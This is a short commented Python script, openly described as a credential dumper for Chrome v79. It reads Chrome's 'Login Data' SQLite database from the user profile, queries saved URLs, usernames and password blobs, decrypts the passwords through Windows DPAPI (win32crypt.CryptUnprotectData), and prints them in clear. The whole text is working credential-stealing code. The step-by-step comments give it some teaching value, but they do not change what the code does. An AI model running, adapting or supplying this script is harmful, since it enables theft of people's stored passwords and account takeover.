# This is a credential dumping script for pre-2020 Google Chrome v79.

import sqlite3,win32crypt,os
# Python libraries sqlite3 and win32crypt allow Python to query with SQL and use built-in Windows encryption methods, respectively.

userdir = os.path.expanduser("~")
chromepath = os.path.join(userdir,"AppData","Local","Google","Chrome","User Data","Default","Login Data")
# This gains access to a file that Chrome used to store logon data in.

conn = sqlite3.connect(chromepath)
c = conn.cursor()
c.execute("SELECT origin_url, username_value, password_value FROM logins;")
# This creates a connection to that folder and queries it for the specified information using SQL.

login_data = c.fetchall()
for URL,username,password in login_data:
    print(password)
    pwd = win32crypt.CryptUnprotectData(password)
    print("%s, %s, %s" % (URL,username,pwd))
    # This prints the data SELECTed above; win32crypt uses the system password to en-/de-crypt, which is accessible, because logged on.
